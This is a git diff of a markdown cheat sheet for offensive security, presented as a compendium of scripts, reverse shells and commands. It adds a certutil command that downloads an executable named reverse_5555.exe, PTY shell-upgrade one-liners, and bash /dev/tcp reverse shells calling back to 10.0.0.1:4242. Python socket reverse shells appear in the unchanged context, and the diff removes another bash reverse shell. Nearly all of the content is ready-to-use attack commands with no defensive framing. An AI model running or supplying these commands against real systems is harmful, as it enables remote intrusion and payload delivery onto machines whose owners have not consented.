@@ -4,11 +4,37 @@
 # Compendium: In Progress - More details to follow
 Compendium:  A concise but detailed collection of Scripts, Reverse Shells and Commands for Offensive Security. 
 
-## Favourites - Most used examples 
+# Favourites - Most used examples 
 
-File transfers - Cooming soon
-PTY Shells - Coming soon 
-commands - Coming Soon
+## File transfers -  More Cooming soon
+```
+certutil -urlcache -split -f http://192.168.119.199/reverse_5555.exe reverse_5555.exe
+```
+
+
+## PTY Shells - More Coming soon 
+
+### Python
+```
+python -c 'import pty; pty.spawn("/bin/sh")'
+```
+### sh
+```
+/bin/sh -i
+```
+### bash
+```
+/bin/bash -i
+```
+## More commands - Coming Soon
+
+### Bash Reverse Shell
+
+```
+bash -i >& /dev/tcp/10.0.0.1/4242 0>&1
+
+0<&196;exec 196<>/dev/tcp/10.0.0.1/4242; sh <&196 >&196 2>&196
+```
 
 
 ## Meterpreter Shells
@@ -97,11 +123,6 @@ python -c 'import socket,subprocess,os,pty;s=socket.socket(socket.AF_INET6,socke
 python -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.0.0.1",4242));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1); os.dup2(s.fileno(),2);p=subprocess.call(["/bin/sh","-i"]);'
 ```
 
-### Bash :
-
-```
-bash -i >& /dev/tcp/192.168.0.1/8080 0>&1
-```
 
 
 ### Php :
